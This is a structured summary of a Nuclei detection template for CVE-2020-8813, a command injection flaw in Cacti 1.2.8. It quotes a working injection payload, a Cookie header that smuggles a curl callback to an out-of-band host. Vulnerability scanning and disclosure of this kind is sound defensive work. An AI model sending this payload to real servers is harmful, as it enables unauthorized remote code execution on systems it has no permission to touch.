---
cve_id: CVE-2020-8813
template_path: nuclei-templates/http/cves/2020/CVE-2020-8813.yaml
affected_product: Cacti
severity: high
authentication: none
external_callback: true
affected_versions: 1.2.8
preconditions: Guest Realtime Graphs privileges enabled
poc_classification: rce
---

## Vulnerability
Cacti v1.2.8 is susceptible to remote code execution via OS command injection (CWE-78) in the `graph_realtime.php` endpoint when processing the `Cacti` cookie. Exploitation requires no authentication if "Guest Realtime Graphs" privileges are enabled for unauthenticated/guest users. CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (score 8.8). Successful exploitation allows arbitrary code execution on the target system. Remediation: upgrade to v1.2.9 or later.

## PoC / Detection
Classification: rce

The template sends a single raw GET request to `/graph_realtime.php?action=init` with the header `Cookie: Cacti=;curl http://{{interactsh-url}}` to inject and execute the `curl` command. Detection confirms the vulnerability by matching the resulting OOB HTTP interaction: `interactsh_protocol` contains "http" and `interactsh_request` contains "User-Agent: curl".

## References
- https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/
- https://github.com/Cacti/cacti/releases
- https://gist.github.com/mhaskar/ebe6b74c32fd0f7e1eedf1aabfd44129
- https://drive.google.com/file/d/1A8hxTyk_NgSp04zPX-23nPbsSDeyDFio/view
- https://nvd.nist.gov/vuln/detail/CVE-2020-8813
